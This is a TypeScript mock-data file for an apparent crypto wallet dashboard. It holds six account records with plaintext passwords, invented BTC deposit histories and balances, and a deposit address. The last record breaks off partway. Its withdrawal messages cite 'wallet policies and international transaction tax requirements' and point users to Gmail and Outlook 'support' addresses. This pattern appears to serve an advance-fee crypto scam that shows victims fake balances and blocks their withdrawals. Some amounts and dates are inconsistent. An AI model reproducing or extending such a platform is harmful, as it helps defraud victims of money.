import { Account } from '@/utils/types';

export const mockAccounts: Account[] = [
  {
    account_id: 'ACC001',
    holder: {
      email: 'a*@gmail.com',
      username: 'sample1',
      password: 'sample1'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'February 08, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1n2s....hs6jd6u881',
        status: 'Success',
        quantity: 0.62,
        amount_in_usd: 60000.0,
        assets: 'BTC'
      },
      {
        date: 'January 22, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4h....22w7z3rld8',
        status: 'Success',
        quantity: 0.094,
        amount_in_usd: 10000.0,
        assets: 'BTC'
      },
      {
        date: 'January 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2l....06x9zrhm3',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 15, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9l....7nt2v9z4h5',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 7, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7m....n3v09lr72',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'December 22, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2r....xnzt7dprm8',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 19, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q8k....9ld07rhmp2',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 10, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q3v....7xlj04rmn28',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'November 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5x....n8z23r02dl',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qhl7znnt6uj4kcez96az2lt9x3w8lax46hvfv2j',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 4.79
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC002',
    holder: {
      full_name: 'Sharon Little',
      jointAccount: false,
      email: 's@gmail.com',
      username: 'SharoLit',
      password: 'Slit_233'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg:
        'Your account has been successfully activated for withdrawals. To learn about your transfer charges, please reach out to our customer care team at smithhelpt2314@gmail.com.',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'February 08, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1n2s....hs6jd6u881',
        status: 'Success',
        quantity: 0.62,
        amount_in_usd: 60000.0,
        assets: 'BTC'
      },
      {
        date: 'January 22, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4h....22w7z3rld8',
        status: 'Success',
        quantity: 0.094,
        amount_in_usd: 10000.0,
        assets: 'BTC'
      },
      {
        date: 'January 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2l....06x9zrhm3',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 15, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9l....7nt2v9z4h5',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 7, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7m....n3v09lr72',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'December 22, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2r....xnzt7dprm8',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 19, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q8k....9ld07rhmp2',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'January 10, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q3v....7xlj04rmn28',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'November 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5x....n8z23r02dl',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qhl7znnt6uj4kcez96az2lt9x3w8lax46hvfv2j',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 4.79
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC003',
    holder: {
      full_name: 'Liam & Monique',
      jointAccount: true,
      email: 'l@gmail.com',
      username: 'Liam&monique',
      password: 'Loveforever2'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg:
        'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerservice@outlook.com',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'February 26, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qxy7...4vn',
        status: 'Success',
        quantity: 9.27,
        amount_in_usd: 800000.0,
        assets: 'BTC'
      },
      {
        date: 'February 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9h2...k85',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 58750.0,
        assets: 'BTC'
      },
      {
        date: 'February 05, 2025',
        description: 'Deposit BTC',
        walletAddress: '3J98t1...NLy',
        status: 'Success',
        quantity: 0.56,
        amount_in_usd: 48500.0,
        assets: 'BTC'
      },
      {
        date: 'January 29, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qar0...mdq',
        status: 'Success',
        quantity: 1.39,
        amount_in_usd: 120400.0,
        assets: 'BTC'
      },
      {
        date: 'January 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qc7s...tk9',
        status: 'Success',
        quantity: 0.91,
        amount_in_usd: 78300.0,
        assets: 'BTC'
      },
      {
        date: 'January 02, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4c0...hl7',
        status: 'Success',
        quantity: 0.59,
        amount_in_usd: 50600.0,
        assets: 'BTC'
      },
      {
        date: 'December 27, 2024',
        description: 'Deposit BTC',
        walletAddress: '1BoatS...pyT',
        status: 'Success',
        quantity: 0.96,
        amount_in_usd: 82900.0,
        assets: 'BTC'
      },
      {
        date: 'December 15, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5sh...8v2',
        status: 'Success',
        quantity: 0.47,
        amount_in_usd: 40500.0,
        assets: 'BTC'
      },
      {
        date: 'December 01, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qkhc...zpw',
        status: 'Success',
        quantity: -24.4,
        amount_in_usd: -2100000.0,
        assets: 'BTC'
      },
      {
        date: 'November 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qmxd...h4k',
        status: 'Success',
        quantity: 2.72,
        amount_in_usd: 142000.0,
        assets: 'BTC'
      },
      {
        date: 'November 16, 2024',
        description: 'Deposit BTC',
        walletAddress: '3FZbgi...Zc5',
        status: 'Success',
        quantity: 0.83,
        amount_in_usd: 42300.0,
        assets: 'BTC'
      },
      {
        date: 'November 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2x4...6v4',
        status: 'Success',
        quantity: 1.26,
        amount_in_usd: 63800.0,
        assets: 'BTC'
      },
      {
        date: 'October 25, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qr4d...fpx',
        status: 'Success',
        quantity: 1.88,
        amount_in_usd: 94700.0,
        assets: 'BTC'
      },
      {
        date: 'October 14, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qewe...nkj',
        status: 'Success',
        quantity: 0.95,
        amount_in_usd: 47100.0,
        assets: 'BTC'
      },
      {
        date: 'October 05, 2024',
        description: 'Deposit BTC',
        walletAddress: '1F1tAa...qX',
        status: 'Success',
        quantity: 1.37,
        amount_in_usd: 67500.0,
        assets: 'BTC'
      },
      {
        date: 'September 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qe5h...rgj',
        status: 'Success',
        quantity: 3.12,
        amount_in_usd: 152000.0,
        assets: 'BTC'
      },
      {
        date: 'September 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qj2s...nwk',
        status: 'Success',
        quantity: 1.24,
        amount_in_usd: 59800.0,
        assets: 'BTC'
      },
      {
        date: 'September 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qwqd...zej',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 32100.0,
        assets: 'BTC'
      },
      {
        date: 'August 27, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1quka...faj',
        status: 'Success',
        quantity: 2.45,
        amount_in_usd: 116300.0,
        assets: 'BTC'
      },
      {
        date: 'August 16, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q42l...pcc',
        status: 'Success',
        quantity: 1.07,
        amount_in_usd: 50400.0,
        assets: 'BTC'
      },
      {
        date: 'August 05, 2024',
        description: 'Deposit BTC',
        walletAddress: '3P3QsM...rjt',
        status: 'Success',
        quantity: 0.78,
        amount_in_usd: 36500.0,
        assets: 'BTC'
      },
      {
        date: 'July 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9s0...h2z',
        status: 'Success',
        quantity: 1.76,
        amount_in_usd: 81900.0,
        assets: 'BTC'
      },
      {
        date: 'July 17, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qr29...n76',
        status: 'Success',
        quantity: 0.91,
        amount_in_usd: 42100.0,
        assets: 'BTC'
      },
      {
        date: 'July 06, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qtl0...fsm',
        status: 'Success',
        quantity: 1.35,
        amount_in_usd: 62200.0,
        assets: 'BTC'
      },
      {
        date: 'June 29, 2024',
        description: 'Deposit BTC',
        walletAddress: '1Mz715...BWX',
        status: 'Success',
        quantity: 2.34,
        amount_in_usd: 107600.0,
        assets: 'BTC'
      },
      {
        date: 'June 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qg3x...m7z',
        status: 'Success',
        quantity: 0.88,
        amount_in_usd: 40100.0,
        assets: 'BTC'
      },
      {
        date: 'June 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qv9m...cpj',
        status: 'Success',
        quantity: 1.17,
        amount_in_usd: 53300.0,
        assets: 'BTC'
      },
      {
        date: 'May 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qm34...s3h',
        status: 'Success',
        quantity: 3.05,
        amount_in_usd: 138200.0,
        assets: 'BTC'
      },
      {
        date: 'May 16, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qnjg...f9g',
        status: 'Success',
        quantity: 0.74,
        amount_in_usd: 33400.0,
        assets: 'BTC'
      },
      {
        date: 'May 05, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4u3...jty',
        status: 'Success',
        quantity: 1.29,
        amount_in_usd: 58100.0,
        assets: 'BTC'
      },
      {
        date: 'April 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qs62...0m3',
        status: 'Success',
        quantity: 1.92,
        amount_in_usd: 85600.0,
        assets: 'BTC'
      },
      {
        date: 'April 17, 2024',
        description: 'Deposit BTC',
        walletAddress: '3BbDtx...diQ',
        status: 'Success',
        quantity: 0.85,
        amount_in_usd: 37700.0,
        assets: 'BTC'
      },
      {
        date: 'April 06, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7gg...jr7',
        status: 'Success',
        quantity: 1.13,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'March 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qrp3...mv3',
        status: 'Success',
        quantity: 2.63,
        amount_in_usd: 115800.0,
        assets: 'BTC'
      },
      {
        date: 'March 17, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qcr8...fyu',
        status: 'Success',
        quantity: 0.96,
        amount_in_usd: 42100.0,
        assets: 'BTC'
      },
      {
        date: 'March 05, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5qy...970',
        status: 'Success',
        quantity: 1.42,
        amount_in_usd: 62000.0,
        assets: 'BTC'
      },
      {
        date: 'February 27, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qkn0...s4h',
        status: 'Success',
        quantity: 1.84,
        amount_in_usd: 79800.0,
        assets: 'BTC'
      },
      {
        date: 'February 16, 2024',
        description: 'Deposit BTC',
        walletAddress: '1BvBMS...VN2',
        status: 'Success',
        quantity: 0.71,
        amount_in_usd: 30700.0,
        assets: 'BTC'
      },
      {
        date: 'February 05, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qh9m...3dw',
        status: 'Success',
        quantity: 1.21,
        amount_in_usd: 52200.0,
        assets: 'BTC'
      },
      {
        date: 'January 29, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qxy2...wlh',
        status: 'Success',
        quantity: 2.17,
        amount_in_usd: 93000.0,
        assets: 'BTC'
      },
      {
        date: 'January 18, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qd4y...efd',
        status: 'Success',
        quantity: 0.82,
        amount_in_usd: 35000.0,
        assets: 'BTC'
      },
      {
        date: 'January 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9x3...4ew',
        status: 'Success',
        quantity: 1.09,
        amount_in_usd: 46300.0,
        assets: 'BTC'
      },
      {
        date: 'December 28, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q0sg...ldf',
        status: 'Success',
        quantity: 1.73,
        amount_in_usd: 72800.0,
        assets: 'BTC'
      },
      {
        date: 'December 17, 2023',
        description: 'Deposit BTC',
        walletAddress: '3Nxwen...p8v',
        status: 'Success',
        quantity: 0.68,
        amount_in_usd: 28500.0,
        assets: 'BTC'
      },
      {
        date: 'December 06, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q0d9...sq0',
        status: 'Success',
        quantity: 1.25,
        amount_in_usd: 52300.0,
        assets: 'BTC'
      },
      {
        date: 'November 29, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qc5z...vh4',
        status: 'Success',
        quantity: 1.97,
        amount_in_usd: 81900.0,
        assets: 'BTC'
      },
      {
        date: 'November 18, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qetu...kzm',
        status: 'Success',
        quantity: 0.89,
        amount_in_usd: 36900.0,
        assets: 'BTC'
      },
      {
        date: 'November 07, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qus3...jyk',
        status: 'Success',
        quantity: 1.33,
        amount_in_usd: 55000.0,
        assets: 'BTC'
      },
      {
        date: 'October 29, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qfj8...xqt',
        status: 'Success',
        quantity: 2.28,
        amount_in_usd: 93800.0,
        assets: 'BTC'
      },
      {
        date: 'October 18, 2023',
        description: 'Deposit BTC',
        walletAddress: '1NDyJt...u1s',
        status: 'Success',
        quantity: 0.75,
        amount_in_usd: 30700.0,
        assets: 'BTC'
      },
      {
        date: 'October 07, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7vw...h08',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 53600.0,
        assets: 'BTC'
      },
      {
        date: 'September 28, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1qglk...4g3',
        status: 'Success',
        quantity: 1.62,
        amount_in_usd: 65800.0,
        assets: 'BTC'
      },
      {
        date: 'September 17, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4rd...7hj',
        status: 'Success',
        quantity: 0.93,
        amount_in_usd: 37600.0,
        assets: 'BTC'
      },
      {
        date: 'September 06, 2023',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5dz...h4m',
        status: 'Success',
        quantity: 1.15,
        amount_in_usd: 46500.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qhl7znnt6uj4kcez96az2lt9x3w8lax46hvfv2j',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 79
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC004',
    holder: {
      full_name: '',
      jointAccount: false,
      email: 's@gmail.com',
      username: 'sarah02',
      password: 'Ritterhouse'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg:
        'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerservice@outlook.com',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'May 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1fxz...rp0a',
        status: 'Success',
        quantity: 0.48,
        amount_in_usd: 50000.0,
        assets: 'BTC'
      },
      {
        date: 'May 13, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qpl...jw94',
        status: 'Success',
        quantity: 2.5,
        amount_in_usd: 200000.0,
        assets: 'BTC'
      },
      {
        date: 'May 12, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1jwe...p9x2',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'May 11, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1rnc...vmke',
        status: 'Success',
        quantity: 1.25,
        amount_in_usd: 100000.0,
        assets: 'BTC'
      },
      {
        date: 'May 10, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1fmc...4zyx',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'May 9, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1vgu...93el',
        status: 'Success',
        quantity: 2.5,
        amount_in_usd: 200000.0,
        assets: 'BTC'
      },
      {
        date: 'May 8, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1dn3...sq08',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'May 7, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1tkx...4hm2',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'May 6, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1zyq...eqm7',
        status: 'Success',
        quantity: 2.5,
        amount_in_usd: 200000.0,
        assets: 'BTC'
      },
      {
        date: 'May 4, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1jla...xztn',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'May 1, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1dxr...ptz4',
        status: 'Success',
        quantity: 1.875,
        amount_in_usd: 150000.0,
        assets: 'BTC'
      },
      {
        date: 'March 6, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1jdk...3dm',
        status: 'Success',
        quantity: 0.25,
        amount_in_usd: 20000.0,
        assets: 'BTC'
      },
      {
        date: 'February 26, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qxy7...4vn',
        status: 'Success',
        quantity: 0.15,
        amount_in_usd: 12000.0,
        assets: 'BTC'
      },
      {
        date: 'February 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q9h2...k85',
        status: 'Success',
        quantity: 0.057,
        amount_in_usd: 4500.0,
        assets: 'BTC'
      },
      {
        date: 'February 05, 2025',
        description: 'Deposit BTC',
        walletAddress: '3J98t1...NLy',
        status: 'Success',
        quantity: 0.38,
        amount_in_usd: 38000.0,
        assets: 'BTC'
      },
      {
        date: 'January 29, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qar0...mdq',
        status: 'Success',
        quantity: 0.85,
        amount_in_usd: 85000.0,
        assets: 'BTC'
      },
      {
        date: 'January 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qc7s...tk9',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 67000.0,
        assets: 'BTC'
      },
      {
        date: 'January 02, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q4c0...hl7',
        status: 'Success',
        quantity: 0.42,
        amount_in_usd: 42000.0,
        assets: 'BTC'
      },
      {
        date: 'December 27, 2024',
        description: 'Deposit BTC',
        walletAddress: '1BoatS...pyT',
        status: 'Success',
        quantity: 0.75,
        amount_in_usd: 75000.0,
        assets: 'BTC'
      },
      {
        date: 'December 15, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5sh...8v2',
        status: 'Success',
        quantity: 0.33,
        amount_in_usd: 33000.0,
        assets: 'BTC'
      },
      {
        date: 'December 01, 2024',
        description: 'Transfer BTC',
        walletAddress: 'bc1qkhc...zpw',
        status: 'Success',
        quantity: -2.5,
        amount_in_usd: -150000.0,
        assets: 'BTC'
      },
      {
        date: 'November 28, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qmxd...h4k',
        status: 'Success',
        quantity: 1.9,
        amount_in_usd: 142000.0,
        assets: 'BTC'
      },
      {
        date: 'November 16, 2024',
        description: 'Deposit BTC',
        walletAddress: '3FZbgi...Zc5',
        status: 'Success',
        quantity: 0.56,
        amount_in_usd: 56000.0,
        assets: 'BTC'
      },
      {
        date: 'November 07, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1q2x4...6v4',
        status: 'Success',
        quantity: 1.1,
        amount_in_usd: 63000.0,
        assets: 'BTC'
      },
      {
        date: 'October 25, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qr4d...fpx',
        status: 'Success',
        quantity: 1.5,
        amount_in_usd: 95000.0,
        assets: 'BTC'
      },
      {
        date: 'October 14, 2024',
        description: 'Deposit BTC',
        walletAddress: 'bc1qewe...nkj',
        status: 'Success',
        quantity: 0.65,
        amount_in_usd: 47000.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: 'bc1qhl7znnt6uj4kcez96az2lt9x3w8lax46hvfv2j',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 19.36
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC005',
    holder: {
      full_name: '',
      jointAccount: false,
      email: 'm*@gmail.com',
      username: 'Mitchelle19',
      password: 'ILovejohn19$'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg:
        'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerrvices@outlook.com',
      transaction_code: '',
      wireDate: true
    },
    transaction_history: [
      {
        date: 'April 5, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7c...976F',
        status: 'Success',
        quantity: 0.011,
        amount_in_usd: 850.0,
        assets: 'BTC'
      },
      {
        date: 'March 28, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q86...1199',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1900.0,
        assets: 'BTC'
      },
      {
        date: 'March 21, 2025',
        description: 'Deposit BTC',
        walletAddress: '3DD87...2148',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1900.0,
        assets: 'BTC'
      },
      {
        date: 'March 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q25...Ec30',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1950.0,
        assets: 'BTC'
      },
      {
        date: 'March 7, 2025',
        description: 'Deposit BTC',
        walletAddress: '1bDA5...197E',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1950.0,
        assets: 'BTC'
      },
      {
        date: 'February 28, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q7d...AFB7',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1950.0,
        assets: 'BTC'
      },
      {
        date: 'February 21, 2025',
        description: 'Deposit BTC',
        walletAddress: '3FABB...694a',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1950.0,
        assets: 'BTC'
      },
      {
        date: 'February 14, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1qaE...454C',
        status: 'Success',
        quantity: 0.025,
        amount_in_usd: 1950.0,
        assets: 'BTC'
      },
      {
        date: 'February 7, 2025',
        description: 'Deposit BTC',
        walletAddress: '17ee1...1e5a',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 1000.0,
        assets: 'BTC'
      },
      {
        date: 'January 31, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q36...1E8f',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 1000.0,
        assets: 'BTC'
      },
      {
        date: 'January 24, 2025',
        description: 'Deposit BTC',
        walletAddress: '39A60...9F8A',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 1000.0,
        assets: 'BTC'
      },
      {
        date: 'January 17, 2025',
        description: 'Deposit BTC',
        walletAddress: 'bc1q5e...f9A9',
        status: 'Success',
        quantity: 0.013,
        amount_in_usd: 1000.0,
        assets: 'BTC'
      },
      {
        date: 'September 1, 2025',
        description: 'Deposit BTC',
        walletAddress: '1264e...b103',
        status: 'Success',
        quantity: 42.81,
        amount_in_usd: 3300000.0,
        assets: 'BTC'
      }
    ],
    assets: [
      {
        assetsName: 'BTC',
        assetsName2: 'Bitcoin',
        walletAddress: '3LUNSXXoBjR9pLk1fshPVpg8NjQoSdeDkn',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/N6UMWP2.png',
        quantity: 53.18
      },
      {
        assetsName: 'ETH',
        assetsName2: 'Ethereum',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/feMQhL4.png',
        quantity: 0
      },
      {
        assetsName: 'BNB',
        assetsName2: 'Binance Coin',
        walletAddress: '0x4dEea33c8A8******ce13ffefA5c052e',
        barCodeImgUrl: 'https://i.imgur.com/ZOqOQmH.png',
        assetsLogo: 'https://i.imgur.com/EKHVvWB.png',
        quantity: 0
      }
    ]
  },
  {
    account_id: 'ACC006',
    holder: {
      full_name: '',
      jointAccount: false,
      email: 'm*@gmail.com',
      username: 'Marc1091',
      password: 'Elon53'
    },
    transaction_mgs_code: {
      transaction_text_msg: 'To continue this transaction, Please enter the code sent to you.',
      transaction_return_msg:
        'Withdrawal failed due to wallet policies and international transaction tax requirements. Please contact our support team for assistance trustWcustomerrvices@outlook.com',
